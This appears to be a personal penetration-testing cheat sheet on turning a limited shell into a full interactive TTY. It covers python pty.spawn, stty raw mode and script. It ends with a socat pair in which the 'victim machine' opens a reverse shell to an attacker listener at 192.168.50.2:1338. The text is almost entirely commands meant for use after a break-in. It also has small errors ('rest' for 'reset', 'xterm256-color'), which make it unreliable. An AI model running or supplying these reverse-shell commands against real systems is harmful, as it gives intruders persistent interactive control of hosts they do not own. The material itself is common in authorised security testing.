---
title: "python-tty-shell"
tags:
  - fetus
---
## python
```sh
python -c 'import pty; pty.spawn("/bin/bash")' 
```

```sh
^Z
```

```sh
stty raw -echo && fg
```
- type in `rest` to reinitialise the terminal and set these:
```sh
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```
## no python 
```sh
/usr/bin/script -qc /bin/bash /dev/null
```
## with [[socat]] 
#### run this on the attacker machine
```sh
socat file:`tty`,raw,echo=0 tcp-listen:1338
```
#### run this on the victim machine 
```sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.50.2:1338
```
